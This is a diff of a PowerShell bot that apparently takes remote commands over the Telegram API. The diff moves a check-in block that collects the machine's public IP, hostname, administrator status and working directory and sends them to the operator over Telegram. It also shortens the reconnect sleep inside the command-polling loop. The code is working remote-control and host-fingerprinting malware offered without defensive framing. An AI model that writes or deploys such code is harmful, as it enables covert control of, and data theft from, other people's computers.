@@ -151,13 +151,6 @@ function commandListener
 
     try 
     {
-        $_ip    = (Invoke-WebRequest -Uri "https://ident.me/").Content                  # Get the Public IP from the ISP
-        $_path  = (Get-Location).Path                                                   # Get the current location of the Bot
-        $_user  = checkAdminRights                                                      # Get the boolean value to check if the user is an administrator or not
-        $_host  = $env:COMPUTERNAME                                                     # Get the current Hostname or the name of the machine
-        $_body  = '{0} ({1}) - IP: {2} - [{3}]' -f $_host, $_user, $_ip, $_path         # Build everything...
-        sendMessage $_body                                                              # Send a message with the body
-
         while (Invoke-RestMethod -Method Get "api.telegram.org")                        # As long as the telegram url is reachable
         {
             $message    = Invoke-RestMethod -Method Get -Uri $api_get_updates           # Get the JSON response about the telegram updates
@@ -233,12 +226,28 @@ function commandListener
     } catch {
         while (-Not(tnc).PingSucceeded)                                                 # If the connection lost wait until connected
         { 
-            Start-Sleep -Milliseconds $wait                                             # Use a sleep timer for relaxing the CPU
-            $wait = $wait + 100                                                         # Increasing the sleep timer by 100ms
+            Start-Sleep -Milliseconds 5                                                 # Use a sleep timer for relaxing the CPU
         }
 
         commandListener                                                                 # Once the connection will be restored reset the listener
     }
+}
+
+
+try {
+    if ((tnc).PingSucceeded) {
+        Write-Host "Sending the connected message to Telegram..."
+        $_ip    = (Invoke-WebRequest -Uri "https://ident.me/").Content                  # Get the Public IP from the ISP
+        $_path  = (Get-Location).Path                                                   # Get the current location of the Bot
+        $_user  = checkAdminRights                                                      # Get the boolean value to check if the user is an administrator or not
+        $_host  = $env:COMPUTERNAME                                                     # Get the current Hostname or the name of the machine
+        $_body  = '{0} ({1}) - IP: {2} - [{3}]' -f $_host, $_user, $_ip, $_path         # Build everything...
+        sendMessage $_body                                                              # Send a message with the body 
+        Write-Host "Message sent"
+    }
+}
+catch {
+    Write-Host $Error[0]
 }
 
 
